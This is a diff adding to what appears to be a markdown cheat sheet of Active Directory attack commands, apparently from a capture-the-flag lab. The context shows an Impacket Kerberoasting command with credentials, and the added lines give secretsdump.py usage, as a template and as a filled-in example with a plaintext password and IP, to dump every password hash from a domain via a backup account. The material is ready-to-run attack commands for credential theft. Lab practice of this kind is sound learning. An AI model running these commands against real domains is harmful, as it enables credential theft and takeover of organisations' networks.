@@ -86,6 +86,15 @@ Example:
 ```
 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.24.234 -request
 ```
+
+Retrieve all password hashes from given user account:
+```
+python3 secretsdump.py [DOMAIN-NAME]/backup:[USERNAME]@[TARGET-IP]
+```
+Example: 
+```
+python3 /opt/impacket/examples/secretsdump.py  spookysec.local/backup:backup2517860@10.10.6.165
+```
 *********************************************************************************
 ## AS-REP Roasting with Rubeus
 
